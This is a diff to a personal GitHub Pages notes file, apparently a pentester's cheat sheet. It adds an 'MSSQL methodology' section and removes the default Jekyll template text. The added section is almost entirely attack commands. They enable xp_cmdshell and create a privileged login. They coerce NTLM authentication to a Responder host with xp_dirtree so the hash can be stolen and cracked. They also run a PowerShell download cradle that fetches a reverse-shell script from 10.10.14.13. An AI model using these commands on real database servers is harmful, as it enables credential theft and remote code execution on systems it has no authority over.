@@ -1,45 +1,34 @@
 ## MSSQL methodology
 
 Use impacket to connect mssqlclient.py user@ip
+
 Once inside:
 
-```create login cmdshell with password = 'test1'
+```
+SQL> select name, database_id, create_date FROM sys.databases ;
+
+create login cmdshell with password = 'test1'
 go
 use master
 go
 create user cmdshell for login cmdshell
 go
 grant execute on xp_cmdshell to cmdshell
+
+-- this turns on advanced options and is needed to configure xp_cmdshell
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+-- this enables xp_cmdshell
+sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+sudo responder -I <interface> #Run that in other console
+SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
+
+#Try to enable code execution
+SQL> enable_xp_cmdshell
+
+#Execute code, 2 sintax, for complex and non complex cmds
+SQL> xp_cmdshell whoami /all
+SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
 ```
 
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/rootedinside/ambrotd.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
